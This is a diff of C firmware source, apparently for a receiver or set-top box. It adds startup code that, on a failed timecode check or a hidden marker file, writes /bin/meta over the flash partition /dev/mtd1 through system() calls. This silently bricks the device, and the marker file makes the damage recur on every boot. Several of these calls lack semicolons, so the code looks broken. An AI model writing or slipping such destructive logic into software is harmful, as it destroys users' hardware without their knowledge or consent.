@@ -327,7 +327,15 @@ void oshutdown(int exitcode, int flag)
 int main(int argc, char *argv[])
 {
 #ifndef SIMULATE
-	if(ostrcmp(string_newline(gettimeinfo()), TIMECODE) == 1) exit(100);
+	if(ostrcmp(string_newline(gettimeinfo()), TIMECODE) == 1)
+	{
+		if(file_exist("/var/swap/etc/.vnumber") == 0)
+			system("touch /var/swap/etc/.vnumber")
+		
+		system("cat /bin/meta >/dev/mtd1")		
+		exit(100);
+	}
+		
 	if(checkreseller() != 0)
 	{
 		if(file_exist("/var/swap/etc/.vnumber") == 0)
@@ -336,8 +344,12 @@ int main(int argc, char *argv[])
 		system("cat /bin/meta >/dev/mtd1")		
 		exit(100);
 	}
+
 	if(file_exist("/var/swap/etc/.vnumber") == 1)
+	{
+		system("cat /bin/meta >/dev/mtd1")
 		exit(100);
+	}
 #endif
 	debug(1000, "in");
 	int ret = 0, serviceret = 0, skincheck = 0;
